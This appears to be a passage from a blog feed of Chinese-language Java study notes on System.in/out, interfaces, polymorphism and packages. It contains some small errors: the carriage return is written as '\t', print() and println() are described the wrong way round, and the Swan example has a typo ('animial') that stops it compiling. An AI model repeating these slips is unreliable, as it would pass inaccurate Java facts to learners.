<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java.lang.System     </span><br><span class="line">public final class System  extends Object&#123;     </span><br><span class="line">   static  PrintStream  err;//标准错误流（输出）、err是对象；  </span><br><span class="line">   static  InputStream  <span class="keyword">in</span>;//标准输入(键盘输入流)、<span class="keyword">in</span>是对象；   </span><br><span class="line">   static  PrintStream  out;//标准输出流(显示器输出流)、out是对象.</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System类不能创建对象，只能直接使用它的三个静态成员;
🌼 每当main方法被执行时,就自动生成上述三个对象;
🌼 System是java.lang包里面的一个类；
🌼 in是java.io.InputStream类的对象，也是System里面的一个数据成员(也称为字段)；
🌼 read()是java.io.InputStream类里的方法，也就是in对象的方法;
🌼 out是java.io.PrintStream类的对象，也是System里面的一个数据成员(也称为字段)；
🌼 print()、println()是java.io.PrintStream类里的方法，也就是out对象的方法;
</font></td></tr></table>

<p>&nbsp;</p>
<h4 id="三、System-in-read-使用"><a href="#三、System-in-read-使用" class="headerlink" title="三、System.in.read()使用"></a><font color="#EE3A8C" face="楷体">三、System.in.read()使用</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System.in.read()方法的作用是按每次读取一个字节（就是ASCII码），然后返回它的<font color="#FF4040">ASCII码十进制</font>;
🌼 从第一次打开System.in输入流开始，以后输入的字节都存放起来，下次从这个里面依次按顺序读取;
🌼 用System.in.read()时，我们在键盘上按下的任何一个键都会被当做是输入值，包括Enter键也会被当做是一个值！当我们按下Enter的时候，实际上发送两个键值：一个回车\t（13），一个是换行\n（10）;
🌼 从键盘输入一个a，char是两个字节存储的，read()一个字节一个字节读取时，暂时把a看作是一个字节，后续深入学习了再来解释😫😂（哈，貌似想通了，当字节流读到字节为0的数据流时会舍去，相当于跳过该字节继续读下一个非0的字节.....后续更新中）----12.27与老师探讨后得知：在流中输入的字符是一个ASCII(即一个字节=8比特)，这个时候就是一个字节，而char存储的时候是按2个字节存储的，注意的是在流中并不是存储，存储一个字符是Unicode码共16位，而流中的ASCII是8位。
建议去读[《java总结输入流输出流》](https://blog.csdn.net/liuxiaogangqq/article/details/25892667)！！！
可参考[Scanner使用方法](https://www.cnblogs.com/ioveNature/p/6797024.html)</font></td></tr></table>

<p><strong>注意事项：</strong></p>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">1、由于在控制台输入时，按下回车键才代表输入完成，输入的内容才会提交到read()方法，所以按下回车之前，程序是不知道你输入了什么的;
2、输入"a"后按下回车，这时候read()方法读到了数据，此时buffer中的数据应该是97 13 10，也就是字符'a','\r','\n'，并且read()方法每次只能从缓冲区中读出一个字符，三次read()就刚好读出这3个字符，之后程序就结束了;
3、只按下回车，此时从流中只读到了"\r"和"\n"，由于没有足够的输入，那么第三次调用read()时阻塞.
参考：[《System.in.read()使用》](https://uule.iteye.com/blog/1128243)；[《System.in输入流深入理解》](https://blog.csdn.net/fengzijinliang/article/details/40741565?utm_source=blogxgwz0)
推荐阅读：[《深入理解JAVA中的IO》](https://www.cnblogs.com/ylspace/p/8128112.html)</font></td></tr></table>

<p>&nbsp;</p>
<h4 id="四、System-out-print-println"><a href="#四、System-out-print-println" class="headerlink" title="四、System.out.print()/println()"></a><font color="#EE3A8C" face="楷体">四、System.out.print()/println()</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System.out.print()输出不换行，System.out.print()输出后换行.
参考[《深入理解System.out.print》](https://blog.csdn.net/idealemail/article/details/47318813).</font></td></tr></table>

<p>&nbsp;</p>
<h4 id="五、Java中System-out-print-函数与Python中print-函数的详解"><a href="#五、Java中System-out-print-函数与Python中print-函数的详解" class="headerlink" title="五、Java中System.out.print()函数与Python中print()函数的详解"></a><font color="#EE3A8C" face="楷体">五、Java中System.out.print()函数与Python中print()函数的详解</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">python中的print()函数和java中的System.out.print()函数都有着打印字符串的功能。
(1). <font color="red">python中:</font> print("hello,world!")
输出为：hello,world!
<font color="red">Java中:</font> System.out.print("hello,world!");
输出为：hello,world!
说明这两个函数的用法是一样的.
(2). <font color="red">python中:</font> print("1+1=",1+1)
输出结果为：1+1= 2
<font color="red">Java中:</font> System.out.print("1+1="+(1+1));
输出结果为：1+1=2
说明在使用print()函数的时候，我们用了一个“,”将“1+1=”和1+1的结果连接起来了，这个“,”起着连接的作用。同时，在使用System.out.print()函数的时候，我们用了一个“+”将“1+1=”和1+1的结果连接起来了，这个“+”也是起着连接作用;
我们再来看他们的输出结果，print()输出的是1+1= 2，“=”与“2”之间有一个空格，而System.out.print()输出的是1+1=2，“=”与“2”之间没有空格。这里我们发现python中的print()函数中的“,”不仅起着连接字符串的作用，而且还表示一个空格.

<p><strong>结论：</strong><br><font color="#FF0000">🌼 python中的print()函数的作用和java中的System.out.print()函数的作用是一样的;<br>🌼 print()函数中“,”和System.out.print()函数中“+”都有着连接字符串的作用;<br>🌼 print()函数中“,”还表示一个空格;<br>🌼 不同的语言都有着很多的相似点，不同的语言又有着不同的新特性.</font><br>参考：<a href="https://m.jb51.net/article/128959.htm">《python中print()函数的“,”与java中System.out.print()函数中的“+”功能详解》</a>.<br></font></td></tr></table></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java接口、包(4.7-4.8)</title>
    <url>/post/Java-Interface-Package5/</url>
    <content><![CDATA[<p>&emsp;<br>&emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>接口 & 包</font></center>

<p>&emsp;</p>
<h3 id="一、-接口"><a href="#一、-接口" class="headerlink" title="一、 接口"></a><font color="#FF6347" face="Comic sans MS">一、 接口</font></h3><h4 id="1-1-接口的概念"><a href="#1-1-接口的概念" class="headerlink" title="1.1  接口的概念"></a><font color="#20B2AA" face="Comic sans MS">1.1  接口的概念</font></h4><p><font face="Comic sans MS"><strong>1.  📒使程序设计和实现相互分离：</strong><br>在单继承的继承树中，设计和实现不可避免地要纠缠在一起。在设计的时候，人们也许只想提供一个类的抽象的接口，而不希望去具体实现它，因为那是实现阶段的事情。使用接口类型可以很完美地解决这个问题。</p>
<p><strong>2.📒弥补Java只支持单重继承的不足：</strong><br>   Java的类型层次结构具有一定的局限——它只支持单继承，一个类只能有一个父类，而不能交叉继承树的其它分支中有用的部分。这样就给面向对象的程序设计带来了一些困难。但是多继承的引入使得继承层次结构变得混乱，更加容易出错和产生二义性。</p>
<p><strong>3.📒约束实现接口的类</strong>:<br>接口只是约束实现了该接口的类必须满足接口的要求。<br>当定义一个接口时，实际上是在编写一个契约，用来描述实现其的类能够做什么，能够充当什么角色，具体怎么做和接口无关。</p>
<p><strong>所以，Java抛弃了多继承，引入一种新的层次结构——<font color="red">接口</font>来达到同样的功能。</strong></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">📒**接口和类的区别：** </font> 
 (1) 类只能单继承，而接口可以多继承。
 (2) 类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的。
 (3) 接口中的方法要用类来实现，一个类可以实现多个接口。
<font color="red">📒**注意：**  </font> 
 (1) 接口可以继承：一个接口可以继承多个其它的接口，
 (2) 接口中的方法要用类来实现 。
 (3) 一个类可以实现多个接口 。
 (4) Java接口反映了对象较高层次的抽象，为描述相互似乎没有关系的对象的共性提供了一种有效的手段。</font></td></tr></table>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-接口的说明"><a href="#1-2-接口的说明" class="headerlink" title="1.2  接口的说明"></a><font color="#20B2AA" face="Comic sans MS">1.2  接口的说明</font></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[修饰符] interface 接口名[extends] [接口列表]</span><br><span class="line">&#123;</span><br><span class="line">   接口体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1.  📒首部：</strong></font><br><strong>修饰符：</strong>或者不使用修饰符（同包访问），或者只能使用public（任意访问）。归结为只能使用public或者缺省.<br><strong>extends：</strong>定义父接口，支持多重继承(多个父接口用逗号分隔)<br>&emsp;&emsp;&emsp;&emsp;public interface Cookable extends Foodable,Printable</p>
<p><font color="#00B2EE"><strong>2.📒接口体：定义常量和抽象方法：</strong></font><br>&emsp;<font color="red"><strong>接口的成员：成员变量和方法</strong></font><br><strong>(1) 接口中的成员变量：</strong>都是隐含public、static、final的——静态最终变量（常量），例如在接口中有下面这行代码：<br>int STEP=5;<br>等同于：<br>public static final int STEP=5;<br><strong>(2) 接口中的方法：</strong>接口中说明的方法都是抽象方法，所有方法隐含public和abstract的 ，例如 int increment(int x)；<br><font color="red">注意， 接口中的方法不能使用下面的修饰符：</font><br>     static<br>     native或synchronized<br>     final<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-接口的使用"><a href="#1-3-接口的使用" class="headerlink" title="1.3  接口的使用"></a><font color="#20B2AA" face="Comic sans MS">1.3  接口的使用</font></h4><p><font face="Comic sans MS">&emsp;接口自己不能提供方法的实现，接口中的方法必须由类实现。Java语言用关键字implements声明类中将实现的接口。声明接口的形式：<br>&emsp;&emsp;<font color="#00B2EE">[类修饰符]  class类名  [extends子句]  [ implements 子句]</font><br><font color="red"><strong>注意：</strong></font><br>在implements子句中可以包含多个接口类型，各个接口类型之间用逗号隔开。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">19</span>]  TestInterface.java 接口的使用示例</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Runner</span></span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Swimmer</span></span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;<span class="function"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Animal</span> <span class="keyword">implements</span> <span class="title">Runner</span>,<span class="title">Swimmer</span> </span>&#123;</span><br><span class="line"><span class="comment">//Person是能跑和游泳的动物，所以继承了Animal，同时实现了Runner和Swimmer两个接口</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">&quot;run&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;swim&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;eat&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInterface</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		TestInterface t=<span class="keyword">new</span> TestInterface();</span><br><span class="line">		Person p=<span class="keyword">new</span> Person();</span><br><span class="line">		t.m1(p);</span><br><span class="line">		t.m2(p);</span><br><span class="line">		t.m3(p);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">(Runner f)</span></span>&#123;f.run();&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">(Swimmer s)</span></span>&#123;s.swim();&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span><span class="params">(Animal a)</span></span>&#123;a.eat();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-对接口的引用"><a href="#1-4-对接口的引用" class="headerlink" title="1.4  对接口的引用"></a><font color="#20B2AA" face="Comic sans MS">1.4  对接口的引用</font></h4><p><font face="Comic sans MS">&emsp;(1) 接口可以作为一种引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，通过这些变量可以访问类所实现的接口中的方法。Java运行时系统动态地确定该使用哪个类中的方法。</p>
<p>&emsp;(2) 把接口作为一种数据类型可以不需要了解对象所对应的具体的类，而着重于它的交互界面。例如，[例4-18]中Person类实现了Runner接口，可以如下赋值，和子类对象赋给父类对象是类似的：<br>          Runner r=new Person();<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-5-使用接口实现多重继承"><a href="#1-5-使用接口实现多重继承" class="headerlink" title="1.5  使用接口实现多重继承"></a><font color="#20B2AA" face="Comic sans MS">1.5  使用接口实现多重继承</font></h4><p><font face="Comic sans MS">&emsp;程序设计有时需要表达这样的意思：<br>&emsp;&emsp;<font color="#00B2EE"> “x从属于a，也从属于b，也从属于c” </font><br><strong>C++：</strong>多重继承，每个类都有具体的实施细节<br><strong>Java：</strong>接口，只有一个类有具体的实施细节<br></font></p>
<p><img data-src="https://i.loli.net/2018/12/27/5c246b3100ab8.png" alt="图片1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">20</span>]  Swan.java 接口实现多重继承</span><br><span class="line"><span class="comment">/* Swan表示天鹅类，它继承了animal基础类，并实现了接口canWalk、canSwim、canFly，即天鹅具有</span></span><br><span class="line"><span class="comment">animal的功能，同时也具有行走、游泳和飞行的功能。这就实现了多重继承。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canWalk</span></span>&#123;   <span class="function"><span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canSwim</span></span>&#123; <span class="function"><span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canFly</span></span>&#123;<span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">animal</span></span>&#123;<span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Swan</span> <span class="keyword">extends</span> <span class="title">animial</span> <span class="keyword">implements</span> <span class="title">canWalk</span>,<span class="title">canSwim</span>,<span class="title">canFly</span></span></span><br><span class="line"><span class="class"></span>&#123;	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span></span><br><span class="line"><span class="function">     </span>&#123; System.out.println(<span class="string">&quot;swan walking!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	 </span>&#123; System.out.println(<span class="string">&quot;swan swimming!&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	 </span>&#123; System.out.println(<span class="string">&quot;swan flying!&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123; System.out.println(<span class="string">&quot;swan eating!&quot;</span>);&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		Swan swan=<span class="keyword">new</span> Swan();</span><br><span class="line">		swan.walk();</span><br><span class="line">		swan.swim();</span><br><span class="line">		swan.fly();</span><br><span class="line">		swan.eat();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-6-抽象类和接口的选择"><a href="#1-6-抽象类和接口的选择" class="headerlink" title="1.6  抽象类和接口的选择"></a><font color="#20B2AA" face="Comic sans MS">1.6  抽象类和接口的选择</font></h4><p><font color="red"><strong><em>问题：接口和抽象类都可以使设计和实现分离，那么继承结构中的基础类应该定义成一个普通类、抽象类还是接口 ？？</em></strong></font><br><font face="Comic sans MS">(1) 在语法上都是可以的，但是把基础类定义成抽象类或接口往往会增加程序的灵活性和容错性；<br>(2) 如果基础类只是定义一些接口，根本不需要具体的实现，<font color="#00B2EE"> <strong>那么首先优先选择使用接口，接口的抽象程度比抽象类更高；</strong></font><strong>如果基础类必须实现方法或者定义成员变量的时候，才考虑采用抽象类。</strong></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-7-多态"><a href="#1-7-多态" class="headerlink" title="1.7  多态"></a><font color="#20B2AA" face="Comic sans MS">1.7  多态</font></h4><p><font face="Comic sans MS">📒<strong>多个类中的多态：</strong>在具有继承关系的多个类中，子类对父类方法的覆盖（不能是重载父类的方法），即子类和父类可以有相同首部的方法，运行的时间决定每个对象到底执行哪个特定的版本。<br>📒<strong>判断程序中是否存在多态：</strong><font color="red"><strong>继承(覆盖)、向上转型、动态绑定。</strong></font></p>
<p>&emsp;<font color="red"><strong>1. 覆盖：</strong></font>前面已经讲过，如下：<br><img data-src="https://i.loli.net/2019/01/08/5c3473153aa24.png" alt="20-1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">21</span>] Shapes.java 多态性示例<span class="number">1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Circle.draw()&quot;</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Circle.erase()&quot;</span>); </span><br><span class="line">  &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Square.draw()&quot;</span>);  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Square.erase()&quot;</span>); </span><br><span class="line">  &#125;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shapes</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doShape</span><span class="params">(Shape s)</span></span>&#123;</span><br><span class="line">  s.draw();</span><br><span class="line">  s.erase();  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Circle c=<span class="keyword">new</span> Circle();</span><br><span class="line">    Square s=<span class="keyword">new</span> Square();</span><br><span class="line">    doShape(c);</span><br><span class="line">    doShape(s);</span><br><span class="line">  &#125;&#125;</span><br><span class="line">运行结果：</span><br><span class="line">Circle.draw()</span><br><span class="line">Circle.erase()</span><br><span class="line">Square.draw()</span><br><span class="line">Square.erase() </span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<font color="red"><strong>2. 向上转型：</strong></font>子类对象可以直接转换成父类对象，即一个对象除了可以当作自己的类型，还可以作为它的基础类型对待，这种把子类型当作它的基本类型处理的过程，就叫作向上转型（即“Upcasting”）<br><strong>例如：</strong><br>Shape s=new Circle();<br>Circle c=new Circle();<br>Square s=new Square();<br>doShape(c);<br>doShape(s);</p>
<p>&emsp;<font color="red"><strong>3. 动态绑定：</strong></font><br>&emsp;&emsp;绑定：将一个方法调用同一个方法体连接起来<br>&emsp;&emsp;早期绑定：程序运行以前执行绑定；<br>&emsp;&emsp;动态绑定（或后期绑定）：在运行期间执行绑定。<br><font color="#00B2EE"><strong>Java支持动态绑定：能在运行期间判断参数的实际类型，并分别调用适当的方法体，从而实现了多态性。在Java中所有非final和非static的方法都会自动地进行动态绑定。</strong></font><br></font></p>
<p><em>如下代码块：</em><br><img data-src="https://i.loli.net/2018/12/27/5c24716ea85b2.png" alt="21"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Triangle.draw()&quot;</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Triangle.erase()&quot;</span>);  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shapes</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doShape</span><span class="params">(Shape s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	s.draw();</span><br><span class="line"> 	s.erase();	 </span><br><span class="line"> &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Circle c=<span class="keyword">new</span> Circle();</span><br><span class="line">    Square s=<span class="keyword">new</span> Square();</span><br><span class="line">    Triangle t=<span class="keyword">new</span> Triangle();</span><br><span class="line">    doShape(c);</span><br><span class="line">    doShape(s);</span><br><span class="line">    doShape(t) ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h3 id="二、-包"><a href="#二、-包" class="headerlink" title="二、 包"></a><font color="#FF6347" face="Comic sans MS">二、 包</font></h3><h4 id="2-1-包的说明和作用"><a href="#2-1-包的说明和作用" class="headerlink" title="2.1  包的说明和作用"></a><font color="#20B2AA" face="Comic sans MS">2.1  包的说明和作用</font></h4><p><font face="Comic sans MS"><strong>1. 📒包的说明：</strong><br>•    包是用于组织类的一种方式，可以对类进行分组，一个包中可以包含任意数量的类和接s口,本身是一种命名机制，具体的表现就是一个文件夹<br>•    包是一种松散的类的集合：一般不要求处于同一个包中的类有明确的相互关系，如包含、继承等，但是由于同一个包中的类在默认情况下可以相互访问，所以为了方便编程和管理，通常把需要在一起工作的类放在一个包里。</p>
<p><strong>2. 📒包的作用：</strong><br>（1）包能够让程序员将类组织成单元，通过文件夹或目录来组织文件和应用程序；<br>（2）包减少了名称冲突带来的问题，可以防止同名的类发生冲突；<br>（3）包能够更大面积的保护类、变量和方法，而不是分别对每个类进行保护；<br>（4）包可以用于标示类。<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-2-包的创建"><a href="#2-2-包的创建" class="headerlink" title="2.2  包的创建"></a><font color="#20B2AA" face="Comic sans MS">2.2  包的创建</font></h4><p><font face="Comic sans MS"><strong>1. 📒无名包：</strong><br>&emsp;&emsp;系统为每个没有明确指明所属包的.java文件默认创建的包<br>&emsp; &emsp; <font color="#00B2EE"><strong>无名包中的类无法被引用和复用</strong></font></p>
<p><strong>2. 📒有名包：</strong><br>     （1）说明格式   package 包名；<br>       &emsp;&emsp; package SubClass;<br>       &emsp;&emsp; package MyClass.SubClass;<br>     （2）<font color="red"><strong>说明语句必须放在整个.java文件的第一行</strong></font> </p>
<p><strong>3. 📒创建包的含义：</strong><br>      &emsp;创建包就是在当前文件夹下创建一个子文件夹，以便存放这个包中包含的所有类的.class文件.</p>
<p><strong>4.</strong> 📒可以在不同的文件中使用相同的包说明语句，这样就可以将不同文件中的类都包含到相同的程序包中.<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SubClass;         <span class="keyword">package</span> MyClass.SubClass;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s1</span></span>&#123;                 <span class="class"><span class="keyword">class</span> <span class="title">s2</span></span>&#123;</span><br><span class="line">……                        ……</span><br><span class="line"> &#125;                         &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="2-3-包的引用"><a href="#2-3-包的引用" class="headerlink" title="2.3  包的引用"></a><font color="#20B2AA" face="Comic sans MS">2.3  包的引用</font></h4><p><font face="Comic sans MS"><strong>1. 📒使用全名引用：</strong><br>&emsp;(1) 同包的类相互引用时：<br>&emsp;&emsp;&emsp;      <font color="red">在使用的属性或方法名前加上类名作为前缀即可.</font><br>&emsp;(2) 不同包中的类相互引用时：<br>&emsp;&emsp;&emsp;      <font color="red">在类名的前面再加上包名——类的全名.</font><br>&emsp;&emsp;&emsp;      例如：Class myDate extends java.util.Date{<br>&emsp;&emsp;&emsp;      java.util.Date d=new java.util.Date();<br>&emsp;&emsp;&emsp;      ……<br>&emsp;&emsp;&emsp;       }</p>
<p><strong>2. 📒使用import：</strong><br>&emsp;&emsp;import可以加载整个包中的文件或包中的某一个文件。import语句的格式为：<br>&emsp;&emsp;&emsp;&emsp;<font color="#00B2EE">import package1[.package2…].(classname|*);</font><br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*; </span><br><span class="line"><span class="keyword">import</span> java.util.Date; </span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*; </span><br><span class="line"><span class="keyword">import</span> java.util.Date; </span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDate</span> <span class="keyword">extends</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">         Date d=<span class="keyword">new</span> Date();</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red" face="Comic sans MS"><strong>注意：java编译器会为所有程序自动引入包java.lang，因此不必用import语句引入它包含的所有的类，但是若需要使用其他包中的类，必须用import语句引入。</strong></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-4-编译和运行包中的类"><a href="#2-4-编译和运行包中的类" class="headerlink" title="2.4  编译和运行包中的类"></a><font color="#20B2AA" face="Comic sans MS">2.4  编译和运行包中的类</font></h4><p><font face="Comic sans MS">当程序中用package语句指明一个包，在编译时产生的字节码文件（.class文件）需要放到相应的以包名为名称的文件夹目录下：<br>   （1）手工建立子目录，以包名命名该目录，再将.class文件复制到相应目录下。<br>   （2）在编译时，使用“javac –d”命令<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-5-Java包"><a href="#2-5-Java包" class="headerlink" title="2.5  Java包"></a><font color="#20B2AA" face="Comic sans MS">2.5  Java包</font></h4><p><font face="Comic sans MS">&emsp;&emsp;Java自带了一些包。这些包以“java.”开头，作为java的一个标准部分发布。学习Java，必须学习Java常用包中的类。从第六章开始，主要内容是介绍Java常用包的使用。</p>
<p><a href="https://www.breakyizhan.com/java/4260.html">包的使用参考。</a><br><a href="https://www.breakyizhan.com/java/4313.html">输入流的使用参考。</a><br>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java语言基础的字符常变量等(3.1-3.3)</title>
    <url>/post/Java-Language-2-1/</url>
    <content><![CDATA[<p>&ensp;<br>&ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>标识符,注释和分隔符、变量和常量、基本类型</font></center>
&ensp;
&ensp;

